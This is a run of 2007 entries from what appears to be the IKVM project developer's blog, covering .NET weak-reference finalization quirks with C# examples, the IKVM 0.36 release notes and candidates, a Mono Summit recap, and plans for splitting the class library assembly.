</div></div><div class="date"><h2 class="dateHeader">Monday, 31 December 2007</h2></div>
<div class="newsItems"><a name="aab0c3562-5031-4d0d-bca8-00b0c96411a7"></a><div class="entry">
	<h3 class="entryTitle">Argh! Part 2</h3>
	<div class="entryBody">
		<CODE><FONT color=#0000ff>using</FONT> System;<FONT color=#0000ff><BR>using</FONT> System.Runtime.InteropServices;<FONT color=#0000ff><BR><BR>class</FONT> <FONT color=#2b91af>Program<BR></FONT>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>GCHandle</FONT> handle;<BR><BR>&nbsp;&nbsp;&nbsp; Program()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; handle = <FONT color=#2b91af>GCHandle.</FONT>Alloc(<FONT color=#0000ff>this</FONT>, <FONT color=#2b91af>GCHandleType</FONT>.WeakTrackResurrection);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp;&nbsp; ~Program()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Console</FONT>.WriteLine(handle.Target != null);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>static void</FONT> Main()<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>Program</FONT>();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>GC</FONT>.Collect();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>GC</FONT>.WaitForPendingFinalizers();<BR>&nbsp;&nbsp;&nbsp; }<BR>}<BR>&nbsp;</CODE>
<P>Judging from the comments, many people had trouble understanding the previous code snippet. The above code is equivalent (except that this actually works on .NET 2.0). Maybe this will help clarify.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/31/2007 22:18:31 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ab0c3562-5031-4d0d-bca8-00b0c96411a7"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ab0c3562-5031-4d0d-bca8-00b0c96411a7">Comments [1]</a>
		
		<br clear="all">
	</div>
</div><a name="afc89b4f3-1208-44c2-ad52-9aedec7fac9b"></a><div class="entry">
	<h3 class="entryTitle">Argh!</h3>
	<div class="entryBody">
		<code><font color="#0000FF">using</font> System;<font color="#0000FF"><br>
 <br>
 class</font> <font color="#2B91AF">Program<br>
 </font>{<br>
&nbsp;&nbsp;&nbsp; <font color="#2B91AF">WeakReference</font> wr;<br>
 <br>
&nbsp;&nbsp;&nbsp;
    Program()<br>
&nbsp;&nbsp;&nbsp;
    {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        wr = <font color="#0000FF">new</font> <font color="#2B91AF">WeakReference</font>(<font color="#0000FF">this</font>, <font color="#0000FF">true</font>);<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <font color="#2B91AF">GC</font>.SuppressFinalize(wr);<br>
&nbsp;&nbsp;&nbsp; }<br>
 <br>
&nbsp;&nbsp;&nbsp;
    ~Program()<br>
&nbsp;&nbsp;&nbsp;
    {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <font color="#2B91AF">Console</font>.WriteLine(wr.IsAlive);<br>
&nbsp;&nbsp;&nbsp;
    }<br>
 <br>
&nbsp;&nbsp;&nbsp;
    <font color="#0000FF">static void</font> Main()<br>
&nbsp;&nbsp;&nbsp;
    {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <font color="#0000FF">new</font> <font color="#2B91AF">Program</font>();<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <font color="#2B91AF">GC</font>.Collect();<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <font color="#2B91AF">GC</font>.WaitForPendingFinalizers();<br>
&nbsp;&nbsp;&nbsp;
    }<br>
}<br>
&nbsp;</code><p>What should the output of this program be? On .NET 1.1 it's <code>True</code> (as 
 expected), but on .NET 2.0 it is <code>False</code>. On .NET 2.0 the GC has 
 special support for finalizing WeakReferences, but it fails to take into 
 account whether <code>GC.SuppressFinalize()</code> has been called (and this may be by 
 design, but it's still broken).</p>
 <p>This may look academic, but it is actually a real issue in the 
 implementation of ReferenceQueues on IKVM. Previously I used <code>
 <a href="http://msdn2.microsoft.com/en-us/library/system.runtime.interopservices.gchandle.aspx">GCHandle</a></code> to keep a weak 
 reference back to the reference object that was being monitored, but because 
 that requires full trust, I changed the code to use 
 <code>WeakReference</code>, but that broke it because of the above mentioned 
 behavior. The work around is easy, but ugly and inefficient, simply keep 
 these weak references in a global hashtable to make sure they are always 
 strongly reachable.</p>
 <p>.NET <b>really</b> needs a better mechanism for doing post-mortem cleanup (i.e. something like <code>
 <a href="http://java.sun.com/javase/6/docs/api/java/lang/ref/ReferenceQueue.html">java.lang.ref.ReferenceQueue</a></code>).</p>
 <p>P.S. By my new policy, I won't be filing a bug with Microsoft since they 
 have amply demonstrated not to care about external bug reports.</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/31/2007 14:33:49 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fc89b4f3-1208-44c2-ad52-9aedec7fac9b"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fc89b4f3-1208-44c2-ad52-9aedec7fac9b">Comments [6]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 28 December 2007</h2></div>
<div class="newsItems"><a name="aef41c9ed-1be4-4c75-a1a1-427fe3aaa437"></a><div class="entry">
	<h3 class="entryTitle">Hello World</h3>
	<div class="entryBody">
		<P>Five and a half years ago, Hello World <A HREF="/PermaLink.aspx?guid=14">ran for the first time</A>... Now, for the first time a statically compiled HelloWorld.exe runs in partial trust (LocalIntranet zone in this case). Here's an exciting screenshot:</P>
<DIV style="FONT-SIZE: 10pt; WIDTH: 300px; COLOR: #c0c0c0; FONT-FAMILY: lucida console; BACKGROUND-COLOR: black; courier: ">C:\sandbox&gt;HelloWorld.exe<BR>Hello World<BR><BR>C:\sandbox&gt;<BR></DIV><BR>
<P>Obviously this doesn't mean things are done, but hopefully it won't take another five years ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/28/2007 16:13:47 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ef41c9ed-1be4-4c75-a1a1-427fe3aaa437"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ef41c9ed-1be4-4c75-a1a1-427fe3aaa437">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 10 December 2007</h2></div>
<div class="newsItems"><a name="a99f7699f-dfc9-4ea9-b08e-fee3c840fc32"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Released</h3>
	<div class="entryBody">
		<P>After what feels like an eternity, I've finally <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">released IKVM 0.36</A>. The binaries are identical to the ones in rc6.</P>
<P><B>Release Notes</B></P>
<P>This document lists the known issues and incompatibilities.</P>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported.</LI>
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM.</LI>
<LI>JNI<BR>
<UL>
<LI>Only supported in the default AppDomain.</LI>
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention).</LI>
<LI>Cannot call string contructors on already existing string instances</LI>
<LI>A few limitations in Invocation API support<BR>
<UL>
<LI>The Invocation API is only supported when running on .NET.</LI>
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported.</LI>
<LI>JNI_GetDefaultJavaVMInitArgs not implemented</LI>
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred.</LI>
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR).</LI>
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL></LI>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL></LI>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError.</LI>
<LI>monitorenter / monitorexit cannot be used on unitialized this reference.</LI>
<LI>Floating point is not fully spec compliant.</LI>
<LI>Volatile fields are not marked with modopt(volatile).</LI>
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters).</LI>
<LI>Synchronized blocks are not async exception safe.</LI>
<LI>Ghost arrays cannot be distinguished from object arrays (isinstance and casting don't differentiate and ArrayStoreException isn't thrown).</LI>
<LI>Class loading is more eager than on the reference VM.</LI>
<LI>Object instances don't get created at new, but only at the invokespecial of the constructor. This causes observable differences with classes that have a finalizer when the constructor arg evaluation throws an exception [with the JSR-133 change in finalization, this is no longer a spec issue, but since the reference VM doesn't correctly implement JSR-133 it still is an implementation difference].</LI>
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses).</LI>
<LI>JSR-133 finalization spec change is not implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor.</LI>
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code).</LI>
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4).</LI>
<LI>Only code compiled in a single assembly fully obeys the JLS binary compability rules.</LI>
<LI>An assembly can only contain one resource with a particular name.</LI>
<LI>Passing incorrect command line options to ikvmc may result in an exception rather than a proper error messages.</LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK build 13. Below is a list of divergences and IKVM specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>GNU Classpath implementation. Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>GNU Classpath implementation with partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.net</TD>
<TD>No IPv6 support implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.security</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.text.Bidi</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.crypto</TD>
<TD>IcedTea implementation. Not supported.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.security</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.swing</TD>
<TD>GNU Classpath implementation. Not supported.</TD></TR>
<TR>
<TD>javax.tools</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>sun.jdbc.odbc</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Image content handlers not implemented.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.print, for example, means that the API is there but there is no back-end to provide the actual printing support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas.<BR><BR>In addition to the issues listed above, the extended charset providers are not included (the ones in charsets.jar in the JRE).</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath).</LI>
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec).</LI>
<LI>java.lang.String.intern() strings are never garbage collected.</LI>
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics.</LI>
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread().</LI>
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor.</LI>
<LI>java.io.File.getCanonicalPath() is broken on Mono on Windows.</LI>
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems.</LI>
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown.</LI>
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>Mono 1.2.5</TD>
<TD>x86*</TD>
<TD>Windows</TD></TR>
<TR>
<TD>Mono 1.2.5</TD>
<TD>x86*</TD>
<TD>Linux</TD></TR>
<TR>
<TD>.NET 1.1</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0</TD>
<TD>x64</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0 SP1</TD>
<TD>x86</TD>
<TD>Windows</TD></TR>
<TR>
<TD>.NET 2.0 SP1</TD>
<TD>x64</TD>
<TD>Windows</TD></TR></TBODY></TABLE>
<P>* Running on Mono has only been tested on x86, but Mono includes the native (platform specific) parts of IKVM, so any platform where Mono runs should in theory be able to run this IKVM release.</P>
<P><B>Partial Trust</B></P>
<P>Partial trust is not supported. The IKVM class library and runtime require Full Trust to be able to run.<BR>&nbsp;</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/10/2007 08:50:56 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=99f7699f-dfc9-4ea9-b08e-fee3c840fc32"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=99f7699f-dfc9-4ea9-b08e-fee3c840fc32">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 07 December 2007</h2></div>
<div class="newsItems"><a name="afe8612d8-8968-4a93-a589-d529b3eb56af"></a><div class="entry">
	<h3 class="entryTitle">Mono Summit 2007</h3>
	<div class="entryBody">
		<P>Last week I attended the Mono Summit 2007 in Madrid. It was a very productive three days and very much fun as well! I got to meet <A href="/permalink.aspx?guid=894943BE-451E-4D6C-A692-77119EB02D06">Zoltan</A>, <A href="http://wadeberrier.blogspot.com/">Wade</A>, <A href="http://www.advogato.org/person/lupus/">Paolo</A>, <A href="http://primates.ximian.com/~massi/blog/">Massi</A> and <A href="http://tirania.org/blog/archive/2006/Oct-05.html">Dick</A> for the first time and enjoyed seeing <A href="http://evain.net/blog/">Jb</A> (of <A href="http://www.mono-project.com/Cecil">Cecil</A> and monolinker fame), <A href="http://blogs.codehaus.org/people/bamboo/">Rodrigo</A> (of <A href="http://boo.codehaus.org/">Boo</A> fame) and <A href="http://tirania.org/blog/index.html">Miguel</A> again.</P>
<P>Jb created a small repro of the monolinker bug that caused it too <A href="/CommentView.aspx?guid=57b1b4e1-778e-4487-89ce-34ab2b1a1de8">fail on IKVM.OpenJDK.ClassLibrary.dll</A>, so hopefully that'll be fixed soon. I also talked to him about using Cecil in ikvmc to free me from the shackles of Reflection.Emit. This is a major chunk of work, but I think it will be worth it.</P>
<P>Zoltan found some weirdness in my usage of DynamicMethod (the DynamicMethod signature for the constructor reflection helper had an extra unused argument, the CLR didn't mind because it matched up with the unused this reference, but Mono didn't like it). Unfortunately, fixing this didn't resolve the problems I had with DynamicMethod on Mono 1.2.5 and 1.2.6, so fast reflection will remain disabled while running on Mono for the time being (on Zoltan's current code base it did work, so when the Mono release after 1.2.6 is out I'll be able to enable it).</P>
<P>Rodrigo did a very interesting and entertaining presentation on <A href="http://boo.codehaus.org/">Boo</A>. I must admit that I haven't seriously played with Boo yet, but it looks extremely interesting. It is a statically typed language that also supports more dynamic typing (like Erik Meijer's "<A href="http://pico.vub.ac.be/~wdmeuter/RDL04/papers/Meijer.pdf">Static Typing Where Possible, Dynamic Typing When Needed</A>"). It also supports some very cool meta programming capabilities. I definitely need to check this out and I recommend you do too.</P>
<P>Paolo and I had a tentative discussion about adding Java bytecode support to the Mono JIT, so that the expensive IKVM&nbsp;just-in-time bytecode to IL conversion can be skipped when running Java code in dynamic mode&nbsp;on Mono. This would be really nice to have, but there aren't any specific plans yet, so don't hold your breath yet.</P>
<P>Finally, I tried to convice <A href="http://blog.secondlife.com/author/babbagelinden/">Jim Purbrick</A> (of SecondLife, who was there because he wants to use Mono to speed up <A href="http://en.wikipedia.org/wiki/Linden_Scripting_Language">LSL</A> and possibly support other languages) that he really should support Java as well ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/07/2007 07:42:20 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fe8612d8-8968-4a93-a589-d529b3eb56af"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fe8612d8-8968-4a93-a589-d529b3eb56af">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 04 December 2007</h2></div>
<div class="newsItems"><a name="af395735b-65d4-45ed-bf73-16caad70dc95"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.36 Release Candidate 6</h3>
	<div class="entryBody">
		<P>This time I really expect this to be the final 0.36 release candidate :-) </P>
<P>The list of changes is relative to the 0.36 rc5, only the DynamicMethod constructor fix is new relative to the 0.37 development snapshot. </P>
<P>Changes: 
<UL>
<LI>Implemented Custom Assembly Class Loaders. 
<LI>Fixed URL.equals() for "ikvmres:" urls. 
<LI>Fixed findResources() bug that caused resources in core assembly to show up twice if a .NET assembly explicitly referenced the core assembly. 
<LI>Added check to prevent defineClass() on an assembly class loader from defining a class that already exists in the assembly. 
<LI>Fixed Class.getModifiers() to mask out ACC_SUPER bit. 
<LI>Fixed a bug in the DynamicMethod based reflection implementation that caused a NullPointerException when generating the setter for a final instance field for code that isn't compiled with -strictfinalfieldsemantics. 
<LI>Fix to make sure that a ghost interface method call always goes thru the target reference wrapping path. (Calling java.lang.CharSequence methods through an interface that extends java.lang.CharSequence would generate incorrect code.) 
<LI>Fixed ghost interface array casting to generate verifiable code. 
<LI>Fixed FileChannelImpl to close the FileDescriptor after releasing the file locks. 
<LI>Fixed DynamicMethod based constructor reflection invocation to have method match the delegate signature.</LI></UL>
<P>Binaries available here:<A href="http://www.frijters.net/ikvmbin-0.36.0.5.zip">ikvmbin-0.36.0.5.zip</A>. 
<P>Sources (+ binaries):<A href="http://www.frijters.net/ikvm-0.36.0.5.zip">ikvm-0.36.0.5.zip</A></P>
<P>External sources (haven't changed since rc1):<A href="http://www.frijters.net/classpath-0.95-stripped.zip">classpath-0.95-stripped.zip</A>,<A href="http://www.frijters.net/openjdk-b13-stripped.zip">openjdk-b13-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/04/2007 08:55:12 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f395735b-65d4-45ed-bf73-16caad70dc95"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f395735b-65d4-45ed-bf73-16caad70dc95">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 19 November 2007</h2></div>
<div class="newsItems"><a name="a57b1b4e1-778e-4487-89ce-34ab2b1a1de8"></a><div class="entry">
	<h3 class="entryTitle">Splitting the Class Library Assembly</h3>
	<div class="entryBody">
		<P>In a <A HREF="/CommentView.aspx?guid=81dc0fb5-6bd2-41ea-a736-bb0f24a6bb7d">comment</A> to the previous post Peter asks:</P>
<P><I>Do you plan to split the classpath assembly into multiple smaller assemblies at some point? The OpenJDK-based one is getting *huge* and when you only use a small subset of JDK (as I think most people who don't use IKVM as an alternative to JRE, but use it so that they can embed Java code in .NET app, do), it's pretty high overhead...</I></P>
<P>Cyprien Noel posted a <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=1772719&amp;group_id=69637&amp;atid=525267">feature request</A>:</P>
<P><I>Would it be possible to split the dll with the jvm classes in 2 or more<BR>parts ? E.g. a basic dll with java.lang, util, math, io, net, text, and<BR>another dll with the other features. Thanks </I></P>
<P>Others have asked similar things. I'm very sympathetic to this request, because the bloat of the Java API has annoyed me ever since JDK 1.2. </P>
<P>Unfortunately this is a very hard problem without upstream support. Since Sun has never had any incentive to reduce dependencies inside the class library (because <A href="http://www.sun.com/software/javafx/">up until now</A> it has always shipped as a single file), there is a pretty tight coupling between many packages in the Java class library. For example, just the static dependencies of <CODE>java.lang.Object</CODE> amount to 1893 classes in the IKVM 0.36 release codebase. Note that these are just the static dependencies and this set of classes won't even allow you to run "Hello World". However, adding a few more classes (to a total of 2676) gives a, what appears to be, workable subset and yields an assembly of approx. 5.5MB. </P>
<P>That looks like a great start, doesn't it? However, the problem is that it isn't at all clear what this assembly supports. For example, it supports the <CODE>http</CODE> protocol, but not the <CODE>https</CODE> protocol. Simply adding the <CODE>https</CODE> protocol handler drags in an additional 1895 classes! </P>
<P>Suppose I put the <CODE>https</CODE> support in a separate assembly and when you test your application you only test with <CODE>http</CODE> URLs so everything works with just the core assembly and you decide to ship only the core assembly. Now a user of your code tries an <CODE>https</CODE> URL and it doesn't work. This may <A href="http://en.wikipedia.org/wiki/Hindsight_bias">seem like an obvious thing</A>, but there are probably other scenarios that aren't as obvious. </P>
<P>The key point here is that I have <B>no idea</B> of most of the inner workings of the class library, so it would be difficult (or extremely time consuming) for me to figure out the best way to split the classes and to give any guidance as to when you'd need to ship what assembly. </P>
<P><B>Why I'm Probably Still Going To Do It</B> </P>
<P>There is another argument for splitting the class library assembly: Performance. For example, depending on the scenario, having several smaller assemblies that are demand loaded may be more efficient than a single huge assembly. Especially because the assemblies are strong named and the CLR verifies the assembly hash when it loads the assembly (if the assembly isn't in the GAC). </P>
<P><B>When?</B> </P>
<P>As is usually the answer: I don't know. It'll be done when it's done. In the meantime you can always download the sources and build your own subset class library assembly :-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/19/2007 08:51:30 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=57b1b4e1-778e-4487-89ce-34ab2b1a1de8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=57b1b4e1-778e-4487-89ce-34ab2b1a1de8">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 15 November 2007</h2></div>
<div class="newsItems"><a name="a81dc0fb5-6bd2-41ea-a736-bb0f24a6bb7d"></a><div class="entry">
	<h3 class="entryTitle">0.36 Release Plan</h3>
	<div class="entryBody">
		<P>Ben asked about the 0.36 release yesterday. Here's the situation: There will be at least one more 0.36 release candidate that includes the new custom assembly class loader support and the fixes I've done since rc5. I'm currently waiting for some test results from the sponsor of the 0.36 release, to make sure that everything that needs to be fixed is fixed before release.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/15/2007 08:12:29 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=81dc0fb5-6bd2-41ea-a736-bb0f24a6bb7d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=81dc0fb5-6bd2-41ea-a736-bb0f24a6bb7d">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 13 November 2007</h2></div>
<div class="newsItems"><a name="ad04eb749-18a2-4e0d-92fb-402b41ace23f"></a><div class="entry">
	<h3 class="entryTitle">Development Snapshot Update</h3>
	<div class="entryBody">
		<P>Three more fixes and a complete set of binaries this time.</P>
<P><B>Changes:</B></P>
<UL>
<LI>Fix to make sure that a ghost interface method call always goes thru the target reference wrapping path. (Calling java.lang.CharSequence methods through an interface that extends java.lang.CharSequence would generate incorrect code.) 
<LI>Fixed ghost interface array casting to generate verifiable code. 
<LI>Fixed FileChannelImpl to close the FileDescriptor after releasing the file locks.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.2873.zip">ikvmbin-0.37.2873.zip</A>.</P>
<P>Update: Fixed the link.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		11/13/2007 08:19:28 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d04eb749-18a2-4e0d-92fb-402b41ace23f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d04eb749-18a2-4e0d-92fb-402b41ace23f">Comments [3]</a>
		
		<br clear="all">
	</div>
